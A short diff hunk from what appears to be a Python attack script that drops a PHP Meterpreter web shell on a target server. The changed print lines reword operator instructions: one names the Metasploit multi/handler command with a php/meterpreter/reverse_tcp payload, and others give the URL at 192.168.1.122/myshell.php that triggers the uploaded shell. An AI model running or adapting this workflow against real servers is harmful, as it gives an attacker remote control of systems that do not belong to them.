@@ -255,8 +255,8 @@ wwwfind(host)
 shelldrop(host)
 msfphp()
 msfdeliver()
-print 'NOW OPEN MSF copy and paste this line -> msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost='+msfhost+' lport='+msfport+' E'
-print 'FINAL INSTRUCTION OPEN THIS URL TO KICK THE SHELL>> http://192.168.1.122/myshell.php'
+print 'Now start metasploit multi handler and configure options for lhost='+msfhost+' lport='+msfport+' E'
+print 'Finally click this link to kick the PHP meterpreter into action -> http://192.168.1.122/myshell.php'
 print '==============================================================================='
 sys.exit(0)
 
